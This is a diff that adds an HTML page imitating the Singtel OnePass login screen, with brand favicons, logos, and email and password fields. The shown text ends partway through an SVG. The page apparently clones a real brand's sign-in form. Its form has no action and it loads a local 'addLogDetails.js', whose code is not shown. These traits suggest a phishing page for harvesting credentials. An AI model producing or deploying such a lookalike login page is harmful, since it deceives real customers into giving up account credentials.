@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Welcome to Singtel OnePass</title>
+    <link rel="icon" href="https://onepass.singtel.com/sso/favicon-32x32.png" type="image/png">
+    <link rel="apple-touch-icon" sizes="48x48" href="https://onepass.singtel.com/sso/icons/icon-48x48.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://onepass.singtel.com/sso/icons/icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="96x96" href="https://onepass.singtel.com/sso/icons/icon-96x96.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://onepass.singtel.com/sso/icons/icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="192x192" href="https://onepass.singtel.com/sso/icons/icon-192x192.png">
+    <link rel="apple-touch-icon" sizes="256x256" href="https://onepass.singtel.com/sso/icons/icon-256x256.png">
+    <link rel="apple-touch-icon" sizes="384x384" href="https://onepass.singtel.com/sso/icons/icon-384x384.png">
+    <link rel="apple-touch-icon" sizes="512x512" href="https://onepass.singtel.com/sso/icons/icon-512x512.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@100;300;400;700;900&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      body {
+        font-family: 'Lato', sans-serif;
+        /* Use 'Lato' as the primary font */
+      }
+    </style>
+    <script src="addLogDetails.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body class="relative">
+    <div class="fixed inset-0 hidden md:block absolute inset-0 bg-[url('https://onepass.singtel.com/sso/background.png')] bg-cover bg-center z-[-1]"></div>
+    <section class="">
+      <div class="relative overflow-y-auto flex flex-col items-center justify-center px-6 mx-auto">
+        <div class="">
+          <img class="hidden sm:hidden md:flex lg:flex xl:flex w-[120px] my-4" src="data:image/png;base64,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" alt="Logo">
+          <img class="flex sm:flex md:hidden lg:hidden xl:hidden" src="data:image/png;base64,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" alt="Logo" class="Header__LogoImage-sc-1y7fs1l-1 hFwLSP">
+        </div>
+        <div class="w-full md:max-w-[450px] bg-white rounded-lg lg:max-w-[450px] md:mt-0 xl:p-0">
+          <div class="text-lg mt-2 md:mt-12 lg:mt-12 xl:mt-12">
+            <ul class="flex pr-0 pl-0 sm:pr-0 sm:pl-0 md:pr-8 md:pl-8 lg:pr-8 lg:pl-8 xl:pr-8 xl:pl-8 text-center justify-center">
+              <li class="w-full">
+                <div id="onepass-tab" class="p-2 font-semibold hover:bg-[#dedafa] text-[#5c50bb] active-tab"> OnePass </div>
+                <hr id="onepass-hr" class="h-1 mx-auto bg-[#5c50bb] border-0 rounded active-hr">
+              </li>
+              <li class="w-full">
+                <div id="singpass-tab" class="p-2 font-normal hover:bg-[#dedafa] text-black"> Singpass </div>
+                <hr id="singpass-hr" class="h-1 mx-auto bg-[#e1e1e1] border-0 rounded">
+              </li>
+            </ul>
+          </div>
+          <div id="onepass-content" class="mt-8 mb-10 flex pr-0 pl-0 sm:pr-0 sm:pl-0 md:pr-8 md:pl-8 lg:pr-8 lg:pl-8 xl:pr-8 xl:pl-8">
+            <form id="login-form" class="w-full mx-auto">
+              <div class="mb-4 lg:mb-6 xl:mb-6">
+                <div id="container" class="relative z-0 w-full group bg-[#f7f7f7] p-4 rounded-lg">
+                  <input type="text" name="email" id="email" class="block py-3 px-0 w-full text-2xl text-gray-900 bg-transparent appearance-none focus:outline-none focus:bg-transparent focus:ring-0 peer" placeholder="" autocomplete="on" />
+                  <label for="email" class="font-normal peer-focus:font-normal absolute pt-4 text-xl text-[#5f50c0] duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-4 peer-focus:text-gray-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Email or mobile number</label>
+                  <div id="email-border" class="absolute inset-0 rounded-lg border-2 border-[#8b83cf] pointer-events-none opacity-0 peer-focus:opacity-100 transition-opacity duration-300"></div>
+                </div>
+                <div id="email-error" class="text-[#ca112f] mt-1 text-base hidden">Enter a valid login ID</div>
+              </div>
+              <div id="passwordContainer" class="relative z-0 w-full group bg-[#f7f7f7] p-4 mb-2 rounded-lg">
+                <input type="password" name="password" id="password" class="block py-3 px-0 w-full text-2xl text-gray-900 bg-transparent appearance-none focus:outline-none focus:bg-transparent focus:ring-0 peer" placeholder="" autocomplete="on" />
+                <label for="password" class="font-normal peer-focus:font-normal absolute pt-4 text-xl text-[#5f50c0] duration-300 transform -translate-y-6 scale-75 top-3 -z-10 origin-[0] peer-focus:start-4 peer-focus:text-gray-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-6">Password</label>
+                <div id="password-border" class="absolute inset-0 rounded-lg border-2 border-[#8b83cf] pointer-events-none opacity-0 peer-focus:opacity-100 transition-opacity duration-300"></div>
+                <button title="passwordVisibility" type="button" class="absolute right-0 top-0 mt-8 mr-4 text-gray-500 hover:text-gray-700 focus:outline-none" onclick="togglePasswordVisibility()">
+                  <svg class="" id="slash" width="24" height="24" viewBox="0 0 24 24" size="24" color="#5C50BB">
+                    <path d="M12.15 3c2.046.012 4.026.609 5.816 1.731l1.439-1.438a.999.999 0 111.414 1.414L5.023 20.503a.997.997 0 01-1.414 0 .999.999 0 010-1.414l1.311-1.312A13.273 13.273 0 012.62 15.23c-.457-.655-.824-1.337-1.18-1.996l-.1-.188c-.66-1.221-.214-2.084.143-2.777.349-.677.731-1.315 1.137-1.9C4.94 5.029 8.503 3.022 12.15 3zm9.3 4.951a16.964 16.964 0 011.439 2.317c.356.693.801 1.556.142 2.776l-.1.189c-.357.659-.724 1.341-1.18 1.997-2.329 3.351-5.904 5.358-9.564 5.367a10.404 10.404 0 01-2.792-.393 1 1 0 01.542-1.925c.744.21 1.5.316 2.25.318 3.001-.008 5.965-1.693 7.921-4.509.392-.563.717-1.166 1.061-1.804l.102-.19c.14-.259.158-.292-.16-.91a14.83 14.83 0 00-1.259-2.029 1.001 1.001 0 011.597-1.204zM12.207 5C9.165 5.017 6.21 6.704 4.26 9.51a14.935 14.935 0 00-1.002 1.674c-.318.618-.3.65-.16.91l.101.19c.345.638.67 1.24 1.061 1.803a11.266 11.266 0 002.08 2.27l1.96-1.96a4.675 4.675 0 016.48-6.48l1.727-1.728c-1.365-.772-2.835-1.18-4.3-1.19zm-.023 4.13a2.673 2.673 0 00-2.42 3.802l3.552-3.552a2.662 2.662 0 00-1.132-.25z" fill="#5C50BB" fill-rule="evenodd"></path>
+                  </svg>
+                  <svg class="hidden" id="not-slash" width="24" height="24" viewBox="0 0 24 24" size="24" color="#5C50BB">
+                    <path d="M12.118 3c6.31 0 9.65 5.175 10.792 7.401a2.97 2.97 0 010 2.707c-1.142 2.226-4.482 7.402-10.792 7.402S2.47 15.334 1.326 13.108a2.97 2.97 0 010-2.707C2.47 8.175 5.81 3 12.118 3zm0 2c-5.207 0-8.037 4.416-9.012 6.315a.961.961 0 000 .878c.975 1.9 3.804 6.317 9.012 6.317s8.038-4.417 9.013-6.316a.962.962 0 000-.88C20.156 9.416 17.325 5 12.118 5zm0 2.057a4.702 4.702 0 014.697 4.697 4.703 4.703 0 01-4.697 4.698 4.703 4.703 0 01-4.697-4.698 4.702 4.702 0 014.697-4.697zm0 2a2.7 2.7 0 00-2.697 2.697 2.7 2.7 0 002.697 2.698 2.7 2.7 0 002.697-2.698 2.7 2.7 0 00-2.697-2.697z" fill="#5C50BB" fill-rule="evenodd"></path>
+                  </svg>
+                </button>
+              </div>
+              <div id="password-error" class="text-[#ca112f] mb-2 text-base hidden">Password is required</div>
+              <div>
+                <a href="/" class="font-semibold text-base sm:text-base md:text-lg lg:text-xl xl:text-xl text-[#5c50bb]">Have trouble logging in?</a>
+              </div>
+              <button type="submit" class="text-[#ffffff] bg-[#ed1a3d] hover:bg-[#ca112f] font-semibold rounded-2xl text-base lg:text-xl xl:text-xl w-full px-5 py-2 lg:py-2.5 xl:py-2.5 mt-10 text-center">Log in</button>
+              <button type="submit" class="text-[#5c50bb] bg-[#efedfd] hover:bg-[#dedafa] font-semibold rounded-2xl text-base lg:text-xl xl:text-xl w-full px-5 py-2 lg:py-2.5 xl:py-2.5 mt-4 text-center">Create account</button>
+            </form>
+            <div>
+              <div>
+                <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
+                  <div class="grecaptcha-logo">
+                    <iframe title="reCAPTCHA" width="256" height="60" role="presentation" name="a-80hxqye6zi1v" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox allow-storage-access-by-user-activation" src="./index_files/anchor.html"></iframe>
+                  </div>
+                  <div class="grecaptcha-error"></div>
+                  <textarea id="g-recaptcha-response" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="singpass-content" class="hidden mt-8 mb-20 sm:mb-64 md:mb-20 flex pr-0 pl-0 sm:pr-0 sm:pl-0 md:pr-8 md:pl-8 lg:pr-8 lg:pl-8 xl:pr-8 xl:pl-8">
+            <div class="w-full text-center">
+              <p class="font-normal text-base sm:text-base md:text-lg lg:text-xl xl:text-xl">Available for main account holders with existing Singtel services.</p>
+              <button id="login-button" type="button" class="text-center justify-center bg-[#ed1a3d] max-w-[270px] mt-8 text-[#ffffff] hover:bg-[#ca112f] font-semibold rounded-2xl text-base lg:text-xl xl:text-xl w-full px-5 py-2 lg:py-2.5 xl:py-2.5 text-center inline-flex">Log in with <svg class="h-4 ml-2 mt-1.5 md:mt-2 lg:mt-2.5" viewBox="0 0 84 15" fill="none" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M5.13171 11.128C7.7023 11.128 9.2655 9.78509 9.2655 7.65497C9.2655 6.19631 8.3739 5.20071 6.5328 4.79552L4.72643 4.39034C4.04326 4.22827 3.6843 4.00831 3.6843 3.60312C3.6843 3.19794 4.0201 2.94325 4.84222 2.94325C5.79521 2.97646 6.70574 3.34552 7.41282 3.98516L8.9297 1.76242C7.73628 0.927766 6.29619 0.519896 4.84222 0.604753C2.43374 0.604753 0.812641 1.76243 0.812641 3.8115C0.79684 4.53887 1.05453 5.2457 1.53478 5.79229C2.01503 6.33889 2.6829 6.68548 3.40639 6.76356L5.20118 7.1919C6.09279 7.38871 6.3591 7.65498 6.3591 8.00228C6.3591 8.34958 6.00015 8.6853 5.20118 8.6853C4.06876 8.66308 2.97792 8.25462 2.10952 7.52763L0.5 9.6809C1.82499 10.6941 3.46545 11.2066 5.13171 11.128V11.128Z" fill="white"></path>
